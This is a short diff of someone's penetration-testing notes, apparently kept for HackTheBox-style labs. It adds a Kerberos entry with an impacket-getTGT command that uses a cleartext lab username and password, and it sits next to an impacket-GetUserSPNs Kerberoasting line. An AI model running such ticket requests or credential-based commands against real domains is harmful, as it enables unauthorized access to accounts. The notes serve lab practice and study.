@@ -7,9 +7,6 @@ disqus: hackmd
 ===
 
 
-# Table of Contents
-[TOC]
-
 # Recon
 ## IP
 ### Nmap
@@ -304,7 +301,8 @@ Mode                 LastWriteTime         Length Name
     - `sudo impacket-GetUserSPNs -request -dc-ip 192.168.181.70 corp.com/pete`\
     - [-] NTLM negotiation failed.
 - Kerberos
-    - ``
+    - `impacket-getTGT frizz.htb/'f.frizzle':'Jenni_Luvs_Magic23' -dc-ip 10.10.11.60`
+    - [*] Saving ticket in f.frizzle.ccache
 
 # Vuln
 ### WPscan
